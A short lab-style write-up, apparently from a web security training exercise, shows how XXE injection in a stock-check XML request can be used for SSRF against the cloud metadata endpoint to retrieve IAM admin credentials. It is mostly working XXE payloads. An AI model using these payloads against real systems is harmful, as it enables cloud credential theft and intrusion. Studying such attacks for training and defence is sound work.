Exploiting XXE to perform SSRF attacks

Building on our previous exploit and the new information provided, we can get some juicy credentials:

Payload:
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

The repsonse will display the folders we can access, in this case "latest"

Invalid product ID: latest

We adapt our payload to it 

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

And now ger access to the "meta-data" folder. Keep doing this until you reach the final goal of admin credentials

Final payload:
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>